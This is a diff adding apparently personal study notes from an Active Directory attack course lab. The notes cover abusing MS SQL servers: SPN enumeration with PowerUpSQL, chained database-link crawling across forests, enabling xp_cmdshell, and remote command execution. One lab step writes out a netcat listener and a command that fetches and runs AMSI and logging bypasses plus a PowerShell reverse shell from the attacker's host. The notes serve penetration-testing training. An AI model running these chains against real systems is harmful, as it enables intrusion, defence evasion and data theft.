@@ -1,0 +1,122 @@
+- There are two more topics that we are going to discuss in the attack parts, one is abusing MSSQL servers, and the other is abusing MSSQL servers while bypassing MDE.
+
+#### Trust Abuse - MS SQL Servers
+- MS SQL servers are generally deployed in plenty in a Windows domain.
+- SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.
+	- This means that it is entirely possible that if we compromise a user, and the user has no interesting ACLs, no administrative rights, no certificate templates, the user may still have an interesting role on a SQL server.
+	- Always check SQL servers out, they can hold very interesting things!
+- For MSSQL and PowerShell hacker-y, lets use [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL).
+- While targeting SQL servers, a lot of times, the focus is kept on command execution or  privilege escalation, especially as the SA (default admin of a SQL server), instead of considering the data stored in the database, which is wrong.
+- Whenever you come across a database, go for it. We are meant to protect data, privileges are just a mean to access data, so getting DAs is cool and fun, but that is not always the focus.
+- Demonstrating impact by contextualising it using the organisation's data may lead to better comprehension of the risk factor during a briefing.
+	- If we are targeting a Pharma company, we can try to look for sensitive Intellectual Property information. (Obviously after making sure that you have prior permission to do so.)
+	- Sensitive data may include Intellectual Property, PII or other customer details.
+- One should also know how to communicate impact to non-technical employees.
+
+#### Enumeration of MS SQL Servers
+- Discovery (SPN Scanning)
+	- In place of looking for a service listening on port 1433, we go to the DC and get a list of SPNs that contain the name MSSQL, which is the default SPN that SQL servers use.
+	- Using this we may also be able to find SQL servers that are set up but not actively listening for requests on the network.
+		- `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`
+		- `Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.ps1`
+		- `Get-SQLInstanceDomain -Verbose`
+			- The command grabs all the SPNs that start with `MSSQL`.
+			- It also shows us details about the servers as well as the instances.
+			- We will observe that there are 3 servers in the lab environment with two instances each.
+			- On `dcorp-mgmt` the service runs under the domain account `svcadmin`, which is a DA.
+			- On `dcorp-mssql` and `dcorp-sql1`, the machine accounts `dcorp-mssql$` and `dcorp-sql1$` are used to sun the services respectively.
+- Check Accessibility (Network Resource Accessibility (Can we access the SQL server?), and Privilege Enumeration (Are we allowed to access the SQL server?))
+	- Command used for checking accessibility:
+		- `Get-SQLConnectionTestThreaded`
+	- We can chain the command above with the enumeration command we used earlier to directly check if we can connect to any of the servers/instances provided to us during enumeration.
+		- `Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose`
+			- If none of the instances are accessible, we would want to log off and log in again before trying to run the connection test again.
+			- We can observe in the results that both the instances on the `dcorp-mssql` server are accessible over the network, and we have some privileges on them.
+		- How to figure out what privileges we have on the SQL servers running?
+			- The command we are going to use is `Get-SQLServerInfo` to check our privileges, chained with `Get-SQLInstanceDomain` to provide us with the list of servers and instances from earlier:
+				- `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
+					- We find out the following details on `dcorp-mssql`:
+						- The Instance name is the same as the name of the server, `dcorp-mssql`.
+						- The service account being used to run the service is `NETWORKSERVICE`.
+						- The SQL instance accepts both Windows and SQL Server authentication.
+							- We can use both domain users and SQL-specific users, like SA (SQL Admin), to access the DB.
+						- The SQL Server version is 2019.
+						- The SQL Server edition is Developer Edition (x64).
+						- We have login as our current user (student1).
+						- Do we have Admin privileges? No!
+							- Unfortunately, for a lot of us, this is where the knowledge base, and thus the attack, on the SQL server ends.
+							-  Though it is entirely possible that there is a user that may not have anything else but access to a SQL server, they might not have interesting access on the specific server we checked, but they may have access to interesting details on another SQL server.
+							- Is there any valid point to make a domain user an admin on a SQL server?
+								- Yes, if we would like to manage a SQL server as a domain user, which is a better way than just using SQL server identities, because domain identities are better protected than SQL server identities. But we should check that the domain user is only provisioned the required SQL server role.
+								- Why? It is not advisable to give a domain user who has to manage SQL servers a SA role, but that is what we often find in the wild, because it is easier to configure.
+
+#### MSSQL - Database Links
+- A database link allows a SQL server to access external data sources like other SQL servers, Oracle DBs, or even just an excel sheet.
+- In case of database links between SQL servers, that is, the SQL servers are "linked", it is possible to execute stored procedures.
+- Database links work even across forest trusts.
+- ![[Pasted image 20250821234456.png]]
+	- Because of DB links, A user who has public access on SQL server A can actually run stored procedures on SQL server B as DB user, and subsequently on SQL server C as SA.
+	- The user may look useless when we look at it initially, but considering DB links, it becomes a lot more dangerous that we initially think.
+	- DB links are direct connections between Databases, and the forest security boundary has no impact on them, SQL server links are like love, they understand no boundaries!
+	- There is nothing stopping DB links, just like love, unless they are not configured at all, or there is a FW literally cutting down on network connections.
+- DB links can get us access, at least limited access on all the DBs.
+- How commonly are DB links implemented?
+	- Very commonly, if we don't find them in an environment, we may not have been looking for them.
+	- Links connecting as long as 128 nodes also exist, although the link paths may not always be linear.
+- How to search for DB links?
+	- Using PowerUpSQL:
+		- `Get-SQLServerLink -Instance dcorp-mssql -Verbose`
+			- We get the information that a link exists from `dcorp-mssql`, named `dcorp-sql1`, the link exists to a SQL server, and `is_data_access_enabled` is set to true, while `is_rpc_out_enabled` is set to false, which are the default settings.
+	- Manually:
+		- `select * from master..sysservers`
+- How to enumerate chained links?
+	- Manually:
+		- We can keep enumerating manually one database at a time, for example, we got access to `dcorp-mssql` and there we saw that we have access to `dcorp-sql1`.
+		- `Openquery()` function can be used to run queries on a linked DB:
+			- `select * from openquery("dcorp-sql1",'select * from master..sysservers')`
+		- Openquery queries can be chained to access links within links (nested links), as follows:
+			- `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","select * from master..sysservers")')`
+		- The problem with chaining Openquery queries is that we have to escape single quotes with each nesting, and the command keeps getting longer and more unmanageable in a recursive manner.
+	- Using PowerUpSQL:
+		- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose`
+	- We will observer after enumerating chained links that we have links chained in the following manner:
+		- `dcorp\student1`@`dcorp-mssql` (not admin) -> `dblinkuser`@`dcorp-sql1` (not admin) -> `sqluser`@`dcorp-mgmt` (not admin) -> `sa`@`eu-sql1` (admin) (`EU-SQL1.EU.EUCORP.LOCAL`)
+	- The chain finally leads to a SQL server in a different forest, with a non-transitive trust, since SQL servers have direct connection, as they are not domain identities.
+	- Once we are able to reach dcorp-mgmt in the chain, which is the last node before we reach `sa`@`eu-sql1`, we can try to decrypt the password for the `sa` user for the SQL server on the `eu-sql1` machine, because when a link is created, the password that the link is created for is stored at the db the link is created from.
+- Prerequisites for Command Execution over DB Links:
+	- During the enumeration phase, we noticed that **`rpcout` is disabled in the environment we are in**, which is its default state.
+	- Prerequisites for Command Execution:
+		- On the target server, either `xp_cmdshell` should be already enabled; or
+		- If `rpcout` is enabled (disabled by default, but can be enabled on the machine (`dcorp-mgmt`) linking to the target server (`eu-sql`), since it is just a switch in the link, which can be modified if we have access to the `dcorp-mgmt` machine in this case):
+			- `xp_cmdshell` can be enabled on the target server, after enabling `rpcout`, by running this command on the previous link, `dcorp-mgmt`:
+				- `EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "eu-sql"`
+	- To avoid digging deeper into SQL server exploitation, we already have a condition met in the lab environment, i.e. `xp_cmdshell` is enabled on the target server for us.
+- Command Execution over DB Links:
+	- How do we execute commands on `eu-sql`:
+		- Using PowerUpSQL:
+			- Use the -QuertyTarget parameter to run Query on a specific instance (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain)
+			- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql`
+		- Manually:
+			- From the initial SQL server, OS commands can be executed using nested link queries:
+				- `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')`
+
+#### Learning Objective 22
+- Get a reverse shell on a SQL Server in the `eurocorp` forest by abusing database links from `dcorp-mssql`.
+	- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'"`
+		- We will observe that the output of the `CustomQuery` parameter is only populated on the `EU-SQL1` server, however in this case this query is attempted on all the SQL servers in the chain that have `xp_cmdshell` enabled.
+	- To avoid command execution where it is not required, we can use the `-QueryTarget` flag:
+		- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql1`
+	- To get a reverse shell:
+		- Setting up a netcat listener:
+			- `C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443`
+		- Setting up HFS for transferring the reverse shell:
+			- Start `hfs` from `C:\AD\Tools`.
+		- Modify the `Invoke-PowerShellTcpEx.ps1` script to have the correct address for the student VM at the last line.
+		- Execute the reverse shell on the `eu-sql1` server using command execution via DB links:
+			- `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt);iex (iwr - UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"' -QueryTarget eu-sql1`
+		- Command Execution:
+			- `$env:username`
+			- `$env:computername`
+			- `$env:userdomain`
+			- `ls env:`
+- EU-SQL had MDE (Microsoft Defender for Endpoints) running, which was logging almost all of our activities with high/critical severity.
